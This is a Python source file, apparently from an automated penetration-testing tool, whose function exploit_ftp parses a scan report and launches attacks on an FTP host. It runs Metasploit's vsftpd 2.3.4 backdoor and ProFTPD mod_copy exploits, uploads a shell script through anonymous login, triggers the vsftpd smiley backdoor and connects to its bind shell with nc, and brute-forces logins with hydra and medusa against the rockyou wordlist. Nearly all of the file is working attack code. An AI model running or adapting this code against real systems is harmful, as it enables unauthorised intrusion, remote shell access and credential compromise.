import subprocess
import re
from pathlib import Path

def exploit_ftp(target: str, report_path: Path) -> str:
    report = report_path.read_text().lower()
    summary = f"## FTP exploitation results for {target}\n"

    if "vsftpd 2.3.4" in report:
        summary += "- vsftpd 2.3.4 detected → launching Metasploit backdoor\n"
        msf = (
            "use exploit/unix/ftp/vsftpd_234_backdoor; "
            f"set RHOSTS {target}; "
            "set PAYLOAD cmd/unix/interact; exploit; exit"
        )
        subprocess.run(["msfconsole", "-q", "-x", msf])
        summary += "  - Metasploit backdoor executed.\n"
    elif "proftpd 1.3.5" in report:
        summary += "- ProFTPD 1.3.5 detected → launching Metasploit mod_copy exploit\n"
        msf = (
            "use exploit/unix/ftp/proftpd_modcopy_exec; "
            f"set RHOSTS {target}; "
            "set PAYLOAD cmd/unix/reverse; set LHOST 127.0.0.1; exploit; exit"
        )
        subprocess.run(["msfconsole", "-q", "-x", msf])
        summary += "  - Metasploit mod_copy executed.\n"
    elif "anonymous" in report and "230 login successful" in report:
        summary += "- Anonymous login successful → attempting enumeration or shell upload\n"
        subprocess.run([
            "bash", "-c",
            f"ftp -n {target} <<EOF\nuser anonymous anonymous\ncd /; ls -la\nput /tmp/shell.sh shell.sh\nquit\nEOF"
        ])
        summary += "  - Enumeration and shell upload attempted.\n"
    elif ":)" in report:
        summary += "- Smiley ':)' detected → manual bind-shell trigger\n"
        subprocess.run([
            "bash", "-c",
            f'(echo -e "USER user:)\\r\nPASS pass\\r\n"; sleep 1;) | nc {target} 21'
        ])
        subprocess.run(["nc", target, "6200", "-q", "5"])
        summary += "  - Bind shell attempted.\n"
    else:
        summary += "- No specific backdoor found; performing comprehensive brute-force\n"
        subprocess.run([
            "hydra", "-L", "/usr/share/wordlists/users.txt",
            "-P", "/usr/share/wordlists/rockyou.txt",
            target, "ftp", "-t", "4", "-f", "-V"
        ])
        subprocess.run([
            "medusa", "-U", "/usr/share/wordlists/users.txt",
            "-P", "/usr/share/wordlists/rockyou.txt",
            "-h", target, "-M", "ftp", "-T", "4", "-v", "4"
        ])
        summary += "  - Hydra and Medusa brute-force completed.\n"

    # Check for additional Nmap-detected CVEs and attempt exploitation
    if re.search(r"ftp-vuln-cve\d+", report):
        summary += "- Potential CVE detected → launching Metasploit CVE scanner\n"
        msf = (
            "use auxiliary/scanner/ftp/ftp_version; "
            f"set RHOSTS {target}; "
            "set VERBOSE true; run; exit"
        )
        subprocess.run(["msfconsole", "-q", "-x", msf])
        summary += "  - Metasploit CVE scan executed.\n"

    return summary
